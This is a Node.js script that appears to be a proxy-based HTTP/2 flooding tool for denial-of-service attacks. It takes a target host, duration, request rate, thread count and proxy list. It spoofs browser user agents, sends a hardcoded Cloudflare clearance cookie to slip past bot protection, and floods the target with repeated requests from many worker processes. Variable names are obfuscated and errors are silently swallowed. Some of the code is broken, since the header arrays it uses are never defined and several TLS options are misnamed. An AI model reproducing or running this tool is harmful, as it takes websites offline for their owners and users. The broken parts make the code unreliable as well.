const net = require('net');
const http2 = require('http2');
const tls = require('tls');
const cluster = require('cluster');
const url = require('url');
const crypto = require('crypto');
const UserAgent = require('user-agents');
const fs = require('fs');

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (tsuneo) {});

if (process.argv.length < 7) {
  console.log('node anus.js host time rps threads proxy');
  process.exit();
}

const headers = {};

function readLines(devontrey) {
  return fs.readFileSync(devontrey, 'utf-8').toString().split(/\r?\n/);
}

function randomIntn(ravonda, nirvaan) {
  return Math.floor(Math.random() * (nirvaan - ravonda) + ravonda);
}

function randomElement(mitzy) {
  return mitzy[randomIntn(0, mitzy.length)];
}

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/12.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0',
];

const args = {
  target: process.argv[2],
  time: parseInt(process.argv[3]),
  Rate: parseInt(process.argv[4]),
  threads: parseInt(process.argv[5]),
  proxyFile: process.argv[6],
};

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder);
}

class NetSocket {
  constructor() {}

  HTTP(_0xc92779, _0x59f60c) {
    const beonica = _0xc92779.address.split(':');
    const aimar = beonica[0];
    const enayah = `CONNECT ${_0xc92779.address}:443 HTTP/1.1\r\nHost: ${_0xc92779.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
    const eurasia = Buffer.from(enayah);
    const trequon = net.connect({
      host: _0xc92779.host,
      port: _0xc92779.port,
    });

    trequon.setTimeout(_0xc92779.timeout * 10000);
    trequon.setKeepAlive(true, 60000);

    trequon.on('connect', () => {
      trequon.write(eurasia);
    });

    trequon.on('data', (dontario) => {
      const samoan = dontario.toString('utf-8');
      const adien = samoan.includes('HTTP/1.1 200');

      if (adien === false) {
        trequon.destroy();
        return _0x59f60c(undefined, 'error: invalid response from proxy server');
      }

      return _0x59f60c(trequon, undefined);
    });

    trequon.on('timeout', () => {
      trequon.destroy();
      return _0x59f60c(undefined, 'error: timeout exceeded');
    });

    trequon.on('error', (elric) => {
      trequon.destroy();
      return _0x59f60c(undefined, 'error: ' + elric);
    });
  }
}

const Header = new NetSocket();

headers[':method'] = 'GET';
headers.GET = ' / HTTP/2';
headers[':path'] = parsedTarget.path;
headers[':scheme'] = 'https';
headers.Referer = 'https://google.com';

headers.accept = randomElement(accept_header);
headers['accept-language'] = randomElement(lang_header);
headers['accept-encoding'] = 'gzip, deflate, br'; 
headers.Connection = 'keep-alive';
headers['upgrade-insecure-requests'] = '1';
headers.TE = 'trailers';
headers['x-requested-with'] = 'XMLHttpRequest';
headers.pragma = 'no-cache';
headers.Cookie = 'cf_clearance=mOvsqA7JGiSddvLfrKvg0VQ4ARYRoOK9qmQZ7xTjC9g-1698947194-0-1-67ed94c7.1e69758c.36e830ad-250.2.1698947194'; 

function runFlooder() {
  const torren = randomElement(proxies);
  const cristie = torren.split(':');
  const kaion = new UserAgent();
  var ethian = kaion.toString();
  headers[':authority'] = parsedTarget.host;
  headers['user-agent'] = randomElement(userAgents);

  const gelisha = {
    host: cristie[0],
    port: parseInt(cristie[1]),
    address: `${parsedTarget.host}:443`,
    timeout: 100,
  };

  Header.HTTP(gelisha, (khaliliah, jaelynne) => {
    if (jaelynne) {
      return;
    }
    khaliliah.setKeepAlive(true, 60000);

    const jekori = {
      ALPNProtocols: ['h2'],
      followAllRedirects: true,
      challengeToSolve: 5,
      clientTimeout: 5000,
      clientlareMaxTimeout: 15000,
      echdCurve: 'GREASE:X25519:x25519',
      ciphers:
        'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
      rejectUnauthorized: false,
      socket: khaliliah,
      decodeEmails: false,
      honorCipherOrder: true,
      requestCert: true,
      secure: true,
      port: 443,
      uri: parsedTarget.host,
      servername: parsedTarget.host,
    };

    const antowine = tls.connect(443, parsedTarget.host, jekori);
    antowine.setKeepAlive(true, 600000);

    const broghan = http2.connect(`https://${parsedTarget.host}`, {
      protocol: 'https:',
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 1000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false,
      },
      maxSessionMemory: 64000,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => antowine,
      socket: khaliliah,
    });

    broghan.settings({
      headerTableSize: 65536,
      maxConcurrentStreams: 20000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 262144,
      enablePush: false,
    });

    broghan.on('connect', () => {
      const bracha = setInterval(() => {
        for (let tailani = 0; tailani < args.Rate; tailani++) {
          const verdena = broghan.request(headers).on('response', (colinda) => {
            verdena.close();
            verdena.destroy();
            return;
          });
          verdena.end();
        }
      }, 1000);
    });

    broghan.on('close', () => {
      broghan.destroy();
      khaliliah.destroy();
      return;
    });

    broghan.on('error', (avanthika) => {
      broghan.destroy();
      khaliliah.destroy();
      return;
    });
  });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);






